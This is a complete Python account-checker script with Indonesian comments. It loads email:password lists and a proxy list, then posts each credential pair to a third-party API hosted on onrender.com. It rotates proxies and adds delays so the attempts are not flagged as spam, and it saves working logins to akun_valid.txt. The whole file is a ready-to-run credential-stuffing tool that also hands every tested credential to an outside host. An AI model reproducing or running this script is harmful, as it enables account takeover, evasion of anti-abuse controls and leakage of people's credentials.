import requests
import time
import random

# URL API pihak ketiga
API_URL = "https://mtchk-sg-3.onrender.com"

# Meminta nama file akun & proxy dari input pengguna
akun_file = input("📄 Masukkan nama file akun (contoh: akun.txt): ")
proxy_file = input("🌐 Masukkan nama file proxy (contoh: proxy.txt / enter jika tidak pakai): ")

# Membaca daftar akun dari file
def load_accounts(file_name):
    try:
        with open(file_name, "r") as file:
            accounts = []
            for line in file.readlines():
                parts = line.strip().split(":")  # Pemisah ":"
                if len(parts) == 2:
                    accounts.append(parts)
                else:
                    print(f"⚠️ Format salah: {line.strip()} (lewati)")
            return accounts
    except FileNotFoundError:
        print(f"❌ File '{file_name}' tidak ditemukan!")
        return []

# Membaca daftar proxy dari file
def load_proxies(file_name):
    try:
        with open(file_name, "r") as file:
            proxies = [line.strip() for line in file.readlines()]
        return proxies
    except FileNotFoundError:
        print("⚠️ File proxy tidak ditemukan! Login tanpa proxy...")
        return []

# Mengecek login setiap akun dengan proxy
def login(email, password, proxy=None):
    payload = {"email": email, "password": password}
    proxy_dict = {"http": proxy, "https": proxy} if proxy else None

    try:
        response = requests.post(API_URL, json=payload, proxies=proxy_dict, timeout=10)

        if response.status_code == 200:
            print(f"✅ {email}:{password} | LOGIN BERHASIL | Proxy: {proxy}")
            with open("akun_valid.txt", "a") as valid_file:
                valid_file.write(f"{email}:{password}\n")
        else:
            print(f"❌ {email}:{password} | GAGAL LOGIN | Proxy: {proxy}")
    except requests.RequestException:
        print(f"⚠️ {email}:{password} | PROXY ERROR | Proxy: {proxy}")

# Load akun & proxy
accounts = load_accounts(akun_file)
proxies = load_proxies(proxy_file) if proxy_file else []

if not accounts:
    exit("❌ Tidak ada akun untuk login!")

print(f"🔹 Menemukan {len(accounts)} akun. Memulai login...\n")

for email, password in accounts:
    proxy = random.choice(proxies) if proxies else None  # Pilih proxy secara acak
    login(email, password, proxy)
    time.sleep(2)  # Delay agar tidak terdeteksi spam

print("\n✅ Semua akun selesai dicek. Akun valid disimpan di 'akun_valid.txt'.")
